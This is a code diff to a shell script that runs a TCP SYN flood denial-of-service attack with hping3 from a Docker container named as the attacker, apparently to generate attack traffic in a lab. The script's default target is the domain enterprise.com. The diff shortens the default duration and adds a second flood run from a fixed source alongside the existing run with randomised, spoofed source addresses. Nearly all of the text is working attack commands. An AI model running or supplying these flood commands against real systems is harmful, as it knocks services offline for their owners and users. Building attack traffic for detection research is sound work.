@@ -20,7 +20,7 @@ fi
 ATTACKER_CONTAINER="$1"
 TARGET="${2:-enterprise.com}"
 PORT="${3:-80}"
-TIMEOUT="${4:-120}"
+TIMEOUT="${4:-60}"
 
 echo "================================"
 echo "Attack: DoS TCP SYN flood (hping3)"
@@ -39,9 +39,18 @@ echo "================================"
 # docker exec "$ATTACKER_CONTAINER" timeout "$TIMEOUT" hping3 -S -p "$PORT" --flood --rand-source --tcp-timestamp "$TARGET"
 
 # Recommended to kill the process using it's PID and not through a timeout (one reason to avoid exiting the main script)
+echo "-----Random Source-----"
 docker exec "$ATTACKER_CONTAINER" sh -c "
   hping3 -S -p $PORT --flood --rand-source --tcp-timestamp $TARGET &
-  HPING_PID=\$!
+  HPING_RND_PID=\$!
   sleep $TIMEOUT
-  kill -2 \$HPING_PID
+  kill -2 \$HPING_RND_PID
+"
+
+echo "-----Same Source-----"
+docker exec "$ATTACKER_CONTAINER" sh -c "
+  hping3 -S -p $PORT --flood --tcp-timestamp $TARGET &
+  HPING_STC_PID=\$!
+  sleep $TIMEOUT
+  kill -2 \$HPING_STC_PID
 "
